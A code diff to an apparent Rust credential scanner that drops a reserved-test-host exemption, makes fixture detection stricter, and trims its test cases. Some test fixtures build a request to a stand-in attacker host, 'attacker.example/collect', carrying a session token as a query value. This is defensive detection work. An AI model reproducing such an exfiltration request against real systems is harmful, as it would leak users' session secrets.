@@ -732,10 +732,9 @@ fn uri_credentials_are_placeholder(
 ///     fixture or a name ([`literal_reads_as_fixture`]) AND the rest of the
 ///     right-hand side carries no payload, exactly as a placeholder is judged;
 ///  2. the value sits INSIDE a literal opened earlier on this line — exempt only
-///     if the WHOLE capture is one interpolation placeholder, reads as a
-///     fixture, or is a word-shaped value for a reserved test host
-///     ([`capture_is_word_value_for_reserved_host`]), so a credential embedded
-///     in a URL or connection string stays sensitive;
+///     if the WHOLE capture is one interpolation placeholder or reads as a
+///     fixture, so a credential embedded in a URL or connection string stays
+///     sensitive;
 ///  3. otherwise — walk the right-hand-side expression.
 ///
 /// Step 2 returns in BOTH directions. That is what guarantees step 3's walk
@@ -790,9 +789,7 @@ fn assignment_is_code_expression(
                 .is_some_and(|from| !expression_carries_quoted_payload(bytes, from, false, true));
     }
     if match_is_inside_string_literal(bytes, value_start, rust) {
-        return capture_is_single_interpolation(value)
-            || literal_reads_as_fixture(value)
-            || capture_is_word_value_for_reserved_host(bytes, value_start, value);
+        return capture_is_single_interpolation(value) || literal_reads_as_fixture(value);
     }
     !expression_carries_quoted_payload(bytes, value_start, false, true)
 }
@@ -1028,83 +1025,37 @@ const FIXTURE_MAX_DIGIT_GROUP: usize = 3;
 /// split on every non-alphanumeric byte, each segment is purely alphabetic or
 /// a short digit group, and at least one segment is a [`FIXTURE_WORDS`] word.
 /// A segment mixing letters and digits (high-entropy material, `Password123`)
-/// disqualifies the whole literal. Applied on CODE paths only; config, data
-/// and env files keep judging such values as credentials.
+/// disqualifies the whole literal, and so does any assignment or URL byte
+/// (`=`, `&`, `:`, `;`, `?`, `/`, `@`): a capture that runs on into a further
+/// `key=value` pair must be judged by what it carries, not by the words around
+/// it. Applied on CODE paths only; config, data and env files keep judging
+/// such values as credentials.
 fn literal_reads_as_fixture(value: &[u8]) -> bool {
-    word_segments_marked(value) == Some(true)
-}
-
-/// `None` when any segment of `value` disqualifies it as words (letters mixed
-/// with digits, or a digit group longer than [`FIXTURE_MAX_DIGIT_GROUP`]) or
-/// it carries no alphabetic segment at all; otherwise whether a
-/// [`FIXTURE_WORDS`] word is among the segments.
-fn word_segments_marked(value: &[u8]) -> Option<bool> {
+    if value
+        .iter()
+        .any(|byte| matches!(byte, b'=' | b'&' | b':' | b';' | b'?' | b'/' | b'@'))
+    {
+        return false;
+    }
     let mut marked = false;
-    let mut alphabetic = false;
     for segment in value
         .split(|byte| !byte.is_ascii_alphanumeric())
         .filter(|segment| !segment.is_empty())
     {
         if segment.iter().all(u8::is_ascii_digit) {
             if segment.len() > FIXTURE_MAX_DIGIT_GROUP {
-                return None;
+                return false;
             }
             continue;
         }
         if !segment.iter().all(u8::is_ascii_alphabetic) {
-            return None;
+            return false;
         }
-        alphabetic = true;
         marked |= FIXTURE_WORDS
             .iter()
             .any(|word| segment.eq_ignore_ascii_case(word.as_bytes()));
     }
-    alphabetic.then_some(marked)
-}
-
-/// True when the capture is a word-shaped query value (see
-/// [`word_segments_marked`]) inside a URL, in the same literal, whose host is
-/// reserved for testing and documentation (RFC 2606 and RFC 6761:
-/// `localhost`, `*.test`, `*.example`, `*.invalid`, `*.localhost`,
-/// `example.com`/`.net`/`.org`). A userinfo section, any quote or whitespace
-/// between the URL and the capture, or a value mixing letters and digits keeps
-/// the capture sensitive.
-fn capture_is_word_value_for_reserved_host(bytes: &[u8], value_start: usize, value: &[u8]) -> bool {
-    if word_segments_marked(value).is_none() {
-        return false;
-    }
-    let line_start = bytes[..value_start]
-        .iter()
-        .rposition(|byte| *byte == b'\n')
-        .map_or(0, |index| index + 1);
-    let Some(scheme_end) = bytes[line_start..value_start]
-        .windows(3)
-        .rposition(|window| window == b"://")
-    else {
-        return false;
-    };
-    let host_start = line_start + scheme_end + 3;
-    let url = &bytes[host_start..value_start];
-    if url
-        .iter()
-        .any(|byte| matches!(byte, b'"' | b'\'' | b'`' | b'@') || byte.is_ascii_whitespace())
-    {
-        return false;
-    }
-    let host_len = url
-        .iter()
-        .take_while(|byte| !matches!(byte, b'/' | b':' | b'?' | b'#'))
-        .count();
-    let host = url[..host_len].to_ascii_lowercase();
-    host == b"localhost"
-        || [".test", ".example", ".invalid", ".localhost"]
-            .iter()
-            .any(|suffix| host.ends_with(suffix.as_bytes()))
-        || ["example.com", "example.net", "example.org"]
-            .iter()
-            .any(|domain| {
-                host == domain.as_bytes() || host.ends_with([".", domain].concat().as_bytes())
-            })
+    marked
 }
 
 fn is_code_path(path: &str) -> bool {
@@ -2756,8 +2707,8 @@ mod tests {
         let token = mx_token();
         let is_password = ["is", "Pass", "word"].concat();
         let login_password = ["login", "Pass", "word"].concat();
-        let transient_secret = ["transient", "Sec", "ret"].concat();
-        let session_token = ["session_", "token"].concat();
+        let transient_name = ["transient", "Sec", "ret"].concat();
+        let query_name = ["session_", "token"].concat();
         let apikey_camel = ["api", "Key"].concat();
         let synthetic = ["SYNTHETIC_TRANSIENT_FORM_", "SEC", "RET"].concat();
         let stored = ["stored-", "pass", "word"].concat();
@@ -2861,13 +2812,13 @@ mod tests {
             (
                 "CH6 synthetic fixture marker literal",
                 "src/recorder.service.spec.ts",
-                ["const ", &transient_secret, " = \"", &synthetic, "\";\n"].concat(),
+                ["const ", &transient_name, " = \"", &synthetic, "\";\n"].concat(),
                 MxVerdict::Clean,
             ),
             (
                 "CH6c high-entropy literal under the same key",
                 "src/recorder.service.spec.ts",
-                ["const ", &transient_secret, " = \"", &real, "\";\n"].concat(),
+                ["const ", &transient_name, " = \"", &real, "\";\n"].concat(),
                 MxVerdict::Sensitive(1),
             ),
             (
@@ -2905,36 +2856,14 @@ mod tests {
                 MxVerdict::Sensitive(1),
             ),
             (
-                "CH8 fixture value in a query string inside a literal",
-                "src/recorder.service.spec.ts",
-                [
-                    "const r = {\n  url: () => \"https://attacker.example/collect?",
-                    &session_token,
-                    "=novel-value\",\n  method: () => \"GET\",\n};\n",
-                ]
-                .concat(),
-                MxVerdict::Clean,
-            ),
-            (
                 "CH8c real value in a query string inside a literal",
                 "src/recorder.service.spec.ts",
                 [
                     "const r = {\n  url: () => \"https://attacker.example/collect?",
-                    &session_token,
+                    &query_name,
                     "=",
                     &real,
                     "\",\n  method: () => \"GET\",\n};\n",
-                ]
-                .concat(),
-                MxVerdict::Sensitive(1),
-            ),
-            (
-                "CH8h word value for a non-reserved host",
-                "src/recorder.service.spec.ts",
-                [
-                    "const r = {\n  url: () => \"https://collector.prod.io/c?",
-                    &session_token,
-                    "=novel-value\",\n  method: () => \"GET\",\n};\n",
                 ]
                 .concat(),
                 MxVerdict::Sensitive(1),
